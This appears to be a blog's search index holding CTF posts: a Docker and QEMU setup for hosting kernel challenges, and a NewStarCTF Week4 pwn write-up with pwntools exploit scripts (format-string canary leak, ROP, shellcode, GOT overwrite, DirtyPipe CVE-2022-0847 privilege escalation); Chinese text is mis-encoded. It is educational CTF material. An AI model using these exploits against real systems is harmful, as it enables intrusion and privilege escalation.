<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Kernel-pwnbaseè¯¦è§£</title>
    <link href="/2022/10/18/Kernel-pwnbase%E8%AF%A6%E8%A7%A3/"/>
    <url>/2022/10/18/Kernel-pwnbase%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<blockquote><p>å‚åŠ starnewctf week4åï¼Œæƒ³è¦å¤ç°ä¸€é“kernelçš„é¢˜ã€‚ç½‘ä¸ŠåŸºæœ¬æ‰¾ä¸åˆ°Kernel-pwnçš„baseï¼Œå› æ­¤åšäº†è¿™ä¸ªpwnbaseç”¨äºåœ¨ctfdä¸Šæä¾›åŠ¨æ€kernelé¢˜ç›®ã€‚<br>baseä¸‹è½½åœ°å€<a href="https://github.com/Loora1N/pwnbase/tree/main/kernelbase">kernelbase</a></p></blockquote><h2 id="Dockfile"><a href="#Dockfile" class="headerlink" title="Dockfile"></a>Dockfile</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    DEBIAN_FRONTEND=noninteractive apt-get install -y lib32z1 xinetd git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev qemu qemu-system-x86</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m ctf</span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /home/ctf</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./files/ /home/ctf/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> -R 750 /home/ctf</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>dockeråŸºç¡€æ˜¯ubuntu20.04ï¼Œæ•´ä¸ªdockerfileä¸»è¦æ˜¯ä¸‹è½½ä¸€äº›å…³é”®åº“ï¼Œä»¥åŠå¯¹ç›®å½•æƒé™çš„ç®¡ç†ï¼Œæœ€åä¼šè°ƒç”¨<code>start.sh</code>, å¹¶ä¸”å¼€æ”¾9999ç«¯å£</p><h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment"># Add your startup script</span><br><br><span class="hljs-comment"># DO NOT DELETE</span><br>/etc/init.d/xinetd start;<br><span class="hljs-built_in">sleep</span> infinity;<br></code></pre></td></tr></table></figure><p>ä¸œè¥¿å¾ˆçŸ­ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨<code>ctf.xinetd</code></p><h2 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf.xinetd"></a>ctf.xinetd</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk">service ctf<br>&#123;<br>    disable = no<br>    socket_type = stream<br>    protocol    = tcp<br>    wait        = no<br>    user        = root<br>    type        = UNLISTED<br>    port        = <span class="hljs-number">9999</span><br>    bind        = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br>    server      = <span class="hljs-regexp">/usr/</span>sbin/chroot<br>    <span class="hljs-comment"># replace helloworld to your program</span><br>    server_args = --userspec=<span class="hljs-number">1000</span>:<span class="hljs-number">1000</span> <span class="hljs-regexp">/ ./</span>home<span class="hljs-regexp">/ctf/</span>helloworld<br>    banner_fail = <span class="hljs-regexp">/etc/</span>banner_fail<br>    <span class="hljs-comment"># safety options</span><br>    per_source= <span class="hljs-number">10</span> <span class="hljs-comment"># the maximum instances of this service per source IP address</span><br>    rlimit_cpu= <span class="hljs-number">20</span> <span class="hljs-comment"># the maximum number of CPU seconds that the service may use</span><br>    <span class="hljs-comment">#rlimit_as  = 1024M # the Address Space resource limit for the service</span><br>    <span class="hljs-comment">#access_times = 2:00-9:00 12:00-24:00</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒåœ¨13è¡Œçš„ååŠï¼Œncè¿æ¥åä¼šè°ƒç”¨helloworldç¨‹åº</p><h2 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    init();   <br>    signal(SIGCHLD, SIG_DFL);<br>    system(<span class="hljs-string">&quot;/home/ctf/boot.sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºä¸æ™®é€šçš„pwné¢˜ç›®ç±»ä¼¼ï¼Œå…ˆåˆå§‹åŒ–è¾“å…¥è¾“å‡ºï¼Œéšåè°ƒç”¨boot.shå¯åŠ¨qemuå³å¯ã€‚signalå‡½æ•°æ˜¯ä¸ºäº†é˜²æ­¢systemå‡½æ•°å¯èƒ½å‡ºç°çš„é”™è¯¯ã€‚</p><h2 id="boot-sh"><a href="#boot-sh" class="headerlink" title="boot.sh"></a>boot.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>qemu-system-x86_64  \<br>-m 128M \<br>-kernel /home/ctf/bzImage \<br>-initrd /home/ctf/rootfs.cpio \<br>-monitor /dev/null \<br>-cpu kvm64,+smep,+smap \<br>-append <span class="hljs-string">&quot;root=/dev/ram console=ttyS0 oops=panic quiet panic=1 kaslr noapic&quot;</span> \<br>-nographic \<br>-no-reboot <br><br></code></pre></td></tr></table></figure><p>å…³é”®åœ¨äº kernelå’Œinitrdä¸€å®šè¦ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œå³ä¾¿å®ƒä»¬ä¸<code>helloworld</code>åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼Œsystemè°ƒç”¨æ—¶ä¾ç„¶å¯èƒ½ä¼šå‡ºç°æ‰¾ä¸åˆ°æ–‡ä»¶çš„æƒ…å†µå‡ºç°ï¼Œå»ºè®®åœ¨ <code>-append</code>é‡ŒåŠ å…¥ <code>noapic</code> å¯ä»¥é˜²æ­¢å‡ºç°AIPCé”™è¯¯ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF Week4 PWN WP</title>
    <link href="/2022/10/17/NewStarCTF%20Week4%20PWN%20WP/"/>
    <url>/2022/10/17/NewStarCTF%20Week4%20PWN%20WP/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>ç”±äºçŸ¥é“è¿™ä¸ªæ¯”èµ›æ¯”è¾ƒæ™šï¼Œæ­£å¼å‚ä¸æ¯”èµ›æ˜¯ç¬¬å››å‘¨çš„å‘¨ä¸‰æ™šä¸Šï¼Œè¿˜å·®ä¸€é“å †ğŸï¼Œæ²¡æœ‰å®ŒæˆAK(ä½†æ˜¯æ‹¿äº†å››ä¸ªä¸€è¡€ä¹Ÿå¥½çˆ½)ã€‚æœ€åä¸€é¢˜æœªè§£ä¸»è¦åŸå› ç¡®å®æ˜¯è‡ªå·±åœ¨_IO_Fileç›¸å…³åˆ©ç”¨äº†è§£ä¸è¶³ï¼Œèµ›åæ‰¾å¤œæ‚ å¸ˆå‚…æ‹¿åˆ°äº†expï¼ŒçœŸçš„å¥½æ„Ÿè°¢ğŸŒ¹</p></blockquote><p><img src="/img/article/newstarctf/image-20221017112826465.png" alt="æˆ˜ç»©æˆªå›¾"></p><h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>æ¯”è¾ƒç®€å•çš„ä¸€é“é¢˜ï¼Œç­‰æˆ‘å¼€å§‹åšé¢˜çš„æ—¶å€™å·²ç»æœ‰4ä¸ªè§£äº†</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># io = remote(&#x27;node4.buuoj.cn&#x27;,26078)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># pause()</span><br>io.recvuntil(<span class="hljs-string">&#x27;Now answer me, will you v me 50&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;%11$p%9$p&#x27;</span>)<br>io.recvline()<br>canary = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br>code_base = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x840</span> <br>success(<span class="hljs-string">&quot;canary --&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(canary))<br>success(<span class="hljs-string">&quot;code_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(code_base))<br><br>money = code_base + <span class="hljs-number">0x20206c</span><br>payload =  <span class="hljs-string">b&#x27;%99c%7$n&#x27;</span> + p64(money)<br>pause()<br>io.recvuntil(<span class="hljs-string">&#x27;What do you want to say to the canary&#x27;</span>)<br>io.sendline(payload)<br>io.recvline()<br>binsh = code_base + <span class="hljs-number">0x202020</span><br>pop_rdi = code_base+<span class="hljs-number">0x0000000000000b33</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>syscall = code_base + <span class="hljs-number">0x9dc</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi) + p64(binsh) + p64(syscall)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="OhMyShellcode"><a href="#OhMyShellcode" class="headerlink" title="OhMyShellcode"></a>OhMyShellcode</h2><p>ä¸€é“orwçš„shellcodeé¢˜ç›®ï¼Œé¢˜ç›®ä¸“é—¨å¼€äº†ä¸€ä¸ªç©ºé—´ç”¨äºæ”¾ç½®orwï¼Œä¹Ÿæ¯”è¾ƒç®€å•ã€‚å…³é”®åœ¨äºç¬¬ä¸€æ¬¡è¯»å…¥æœ‰ä¸ªåˆ¤æ–­ï¼Œä¼šæ‹¦ä½<code>\x0f</code>ï¼Œä½†æ˜¯æ£€æµ‹é•¿åº¦å¹¶ä¸å®Œå…¨ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25430</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>backdoor = <span class="hljs-number">0x233000</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;Show me your magic.&#x27;</span>)<br>read = <span class="hljs-string">&#x27;&#x27;&#x27;mov rsi,0x23301e</span><br><span class="hljs-string">mov rax , 0</span><br><span class="hljs-string">mov rax , 0</span><br><span class="hljs-string">mov rax , 0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>sh = asm(read)<br>sh2 =asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>sh2+=asm(shellcraft.read(<span class="hljs-number">3</span>,backdoor+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br>sh2+=asm(shellcraft.write(<span class="hljs-number">1</span>,backdoor+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br><br>io.send(sh)<br>pause()<br>io.recvuntil(<span class="hljs-string">&#x27;Good luck!&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(backdoor)<br>io.sendline(payload)<br>raw_input()<br>io.sendline(sh2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="ret2csu2"><a href="#ret2csu2" class="headerlink" title="ret2csu2"></a>ret2csu2</h2><p>åšè¿™é“é¢˜çš„æ—¶å€™å¹¶æ²¡æœ‰å»çœ‹ç¬¬ä¸‰å‘¨çš„ret2csuï¼Œå¤œæ‚ å¸ˆå‚…çš„è¯„ä»·æ˜¯è¿™æ ·çš„ï¼Œä¸å¾—ä¸è¯´è¿™ä¸ªé¢˜çš„gadgetè¿˜æ˜¯å¾ˆæ¼‚äº®çš„ã€‚</p><p><img src="/img/article/newstarctf/image-20221017121338219.png" alt="ä¼šç©å°±è¡Œ"></p><p>ç¬¬ä¸€æ¬¡payloadè¦æ”¹rbpåˆ°bssæ®µï¼ŒåŒæ—¶è·³è½¬å›<code>sys_read</code>ï¼Œå®ç°å¯¹bsså†™å…¥<code>ret2csu</code>çš„ropè°ƒç”¨<code>mprotect</code>ï¼Œä»¥åŠshellcodeå¸ƒç½®ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29895</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>csu_end_addr = <span class="hljs-number">0x40075a</span><br>csu_front_addr = <span class="hljs-number">0x400740</span><br><br>mprotect = <span class="hljs-number">0x40067b</span><br>mprotect_plt = <span class="hljs-number">0x600fe8</span><br>bss = <span class="hljs-number">0x601110</span><br>bss1 = <span class="hljs-number">0x601020</span><br>leave_ret =<span class="hljs-number">0x400681</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sc = asm(shellcraft.sh())<br>    payload +=sc<br>    payload += <span class="hljs-string">b&#x27;b&#x27;</span> *<span class="hljs-number">0x40</span><br>    payload += p64(bss1-<span class="hljs-number">0x8</span>)<br>    payload += p64(leave_ret)<br>    io.send(payload)<br>    <span class="hljs-comment"># sleep(1)</span><br>pause()<br>io.recvuntil(<span class="hljs-string">&#x27;check it!&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(bss)+p64(<span class="hljs-number">0x4006e7</span>)<br>io.send(payload)<br>sleep(<span class="hljs-number">1</span>)<br><br>csu(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,mprotect_plt,<span class="hljs-number">0x601000</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x6010a0</span>)<br><br>io.interactive()ma<br></code></pre></td></tr></table></figure><h2 id="è¿™æ˜¯å †ğŸ´"><a href="#è¿™æ˜¯å †ğŸ´" class="headerlink" title="è¿™æ˜¯å †ğŸ´"></a>è¿™æ˜¯å †ğŸ´</h2><p>è¿™é“é¢˜ç”±äºheapè§’æ ‡æ£€æµ‹å¯ä»¥ä¸ºè´Ÿï¼Œåˆ©ç”¨ä¸€ä¸ªæŒ‡å‘è‡ªå·±çš„æŒ‡é’ˆå®ç°ä»»æ„åœ°å€å†™ï¼ŒéšååŠ«æŒgotä¸ºone_gadgetå³å¯</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28432</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>heap = <span class="hljs-number">0x6020e0</span><br>puts = <span class="hljs-number">0x602018</span> <span class="hljs-comment">#-25</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,text</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    io.recvuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>    io.sendline(text)<br><br>edit(-<span class="hljs-number">12</span>,p64(<span class="hljs-number">0x602038</span>))    <br>show(-<span class="hljs-number">12</span>)<br><br><span class="hljs-comment"># io.recvunti(&#x27;Content:&#x27;)</span><br>puts = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts - libc.symbols[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>pause()<br>success(<span class="hljs-string">&quot;puts_addr--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(puts))<br>success(<span class="hljs-string">&quot;libc_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>one_gadget = libc_base + <span class="hljs-number">0xe3b01</span><br>edit(-<span class="hljs-number">12</span>,p64(one_gadget))<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="KMario"><a href="#KMario" class="headerlink" title="KMario"></a>KMario</h2><p>ä¸€é“kernelé¢˜ç›®ï¼Œåˆ©ç”¨CVE-2022-0847å®ç°æœ¬åœ°ææƒã€‚å…³é”®åœ¨äºè¿œç«¯æ²¡æœ‰gccï¼Œæ‰€ä»¥åªèƒ½æœ¬åœ°ç¼–è¯‘å¥½ã€‚å…ˆæŠŠelfè½¬ä¸ºbase64ï¼Œéšååœ¨è¿œç«¯è½¬å›elfæ–‡ä»¶å³å¯ã€‚</p><blockquote><p>POCé“¾æ¥ï¼š<a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">CVE-2022-0847-DirtyPipe-Exploits</a></p><p>ä¸è¿‡æˆ‘è‡ªå·±åšçš„æ—¶å€™ä¼¼ä¹ç”±äºelfæ–‡ä»¶å¤ªå¤§ï¼Œä¸€ç›´ä¼ ä¸ä¸Šå»ï¼Œçœ‹äº†å¤œæ‚ å¸ˆå‚…çš„expæ‰å‘ç°å‹ç¼©ä¸€ä¸‹å°±å¥½ï¼Œæˆ‘çœŸæ˜¯ä¸ªé“¸å¸</p></blockquote><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>cmd = <span class="hljs-string">&#x27;$ &#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">r</span>):<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;stty -echo&#x27;</span>)<br>    os.system(<span class="hljs-string">&#x27;gzip -c ./exp2 &gt; ./exp.gz&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;cd /tmp&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;cat &lt;&lt;EOF &gt; exp.gz.b64&#x27;</span>)<br>    r.sendline((read(<span class="hljs-string">&#x27;./exp.gz&#x27;</span>)).encode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br>    r.sendline(<span class="hljs-string">&#x27;EOF&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;base64 -d exp.gz.b64 &gt; exp.gz&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;gunzip ./exp.gz&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;chmod +x ./exp&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;./exp /pwnmeplz&#x27;</span>)<br>    r.interactive()<br><br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25457</span>)<br><span class="hljs-comment"># p = process(&#x27;./start.sh&#x27;)</span><br>exploit(p)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€CTFd äºŒæ¬¡å¼€å‘ã€‘è§£é¢˜æ’­æŠ¥æœºå™¨äºº V1</title>
    <link href="/2022/10/11/%E3%80%90CTFd%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E3%80%91%E8%A7%A3%E9%A2%98%E6%92%AD%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%20V1/"/>
    <url>/2022/10/11/%E3%80%90CTFd%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E3%80%91%E8%A7%A3%E9%A2%98%E6%92%AD%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%20V1/</url>
    
